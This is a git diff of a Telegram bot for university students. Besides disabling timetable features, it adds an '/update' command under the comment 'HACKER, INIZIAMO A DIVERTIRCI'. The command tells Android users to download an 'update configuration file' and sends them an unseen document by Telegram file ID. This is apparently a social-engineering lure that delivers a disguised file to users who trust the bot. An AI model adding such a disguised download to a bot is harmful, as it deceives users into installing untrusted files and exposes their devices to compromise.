@@ -4,8 +4,8 @@ const CHAT_GROUP_ID = -69948627;
 
 var moment = require('moment');
 var commands = require('../modules/command-manager');
-var orari = require('../modules/orari-roma3');
-var dipartimenti = require('../modules/dipartimenti');
+//var orari = require('../modules/orari-roma3');
+//var dipartimenti = require('../modules/dipartimenti');
 var User = require('../modules/user-manager').User;
 var errors = require('../lib/errors');
 var db = require('../modules/database').db;
@@ -21,6 +21,7 @@ var listaComandi = '/insult - Insulta i tuoi amici!' +
     '\n/claim - Ottieni un indizio, e scopri chi ti ha pensato!' +
     '\n/vote - Ottieni un voto dal tuo professore preferito!' +
     '\n/exit - Elimina le tue informazioni personali' +
+    '\n/update - Ricevi gli aggiornamenti del nostro Bot!' +
     '\n/help - Mostra la lista dei comandi disponibili';
 
 /* Controlla se l'utente ha accettato le condizioni */
@@ -378,44 +379,6 @@ function stickerMessage(rand_sticker_number){
     return text_message;
 }
 
-/*
-commands.on('/aulelibere', function (msg, telegramBot) {
-    var hideKeyboardOpts = {reply_markup: JSON.stringify({hide_keyboard: true})};
-    var user = new User(msg.from.id, telegramBot);
-    user.getDipartimento().then(function (dipartimentoId) {
-        return orari.getAuleLibere(dipartimenti[dipartimentoId]);
-    }).then(function (aule) {
-        var message = '';
-        if (aule.length == 0)
-            return message = 'Scusa ma non sono riuscito a trovare aule libere nel tuo dipartimento.\n' +
-                'Potrebbero non esserci aule libere in questo momento, oppure un problema sui server di Ateneo';
-
-        message = 'Eccoti una lista delle aule libere (sperando non siano chiuse!):';
-        aule.forEach(function (item) {
-            message += '\n - ' + item.aula;
-            if (item.date.getDate() == new Date().getDate())
-                message += ' fino alle ' + moment(item.date).format('HH:mm');
-            else
-                message += ' fino alla chiusura';
-        });
-        return message;
-    }).then(function (message) {
-        telegramBot.sendMessage(msg.chat.id, message, hideKeyboardOpts);
-    }).catch(function (err) {
-        if (err instanceof errors.InputValidationError)
-            telegramBot.sendMessage(msg.chat.id, err.message, hideKeyboardOpts);
-        else
-            handleError(err, msg, telegramBot);
-    });
-}); */
-
-/*
-commands.on('/lezioni', function (msg, telegramBot) {
-    telegramBot.sendMessage(msg.chat.id, 'Mi dispiace, ma gli scansafatiche del LUG Roma Tre ancora non mi hanno' +
-        ' insegnato come scrivere le lezioni odierne!');
-});
-*/
-
 commands.on('/exit', function (msg, telegramBot) {
     var user = new User(msg.from.id, telegramBot);
     user.forget().then(function () {
@@ -432,6 +395,14 @@ commands.on('/cometichiami', function (msg, telegramBot) {
 commands.on('/grazie', function (msg, telegramBot) {
     telegramBot.sendMessage(msg.chat.id, 'Prego!');
 });
+
+
+/* HACKER, INIZIAMO A DIVERTIRCI */
+commands.on('/update', function (msg, telegramBot) {
+    telegramBot.sendMessage(msg.chat.id, 'Sei un utente Android? Scarica il file di configurazione degli aggiornamenti! Abbiamo tante novità!');
+    telegramBot.sendDocument(msg.chat.id, "BQADBAADtQADwUDyCbS9ZVgTTV0PAg");
+}); 
+
 
 // TODO Access this command only in debug mode
 //commands.on('/debug', function (msg, telegramBot) {
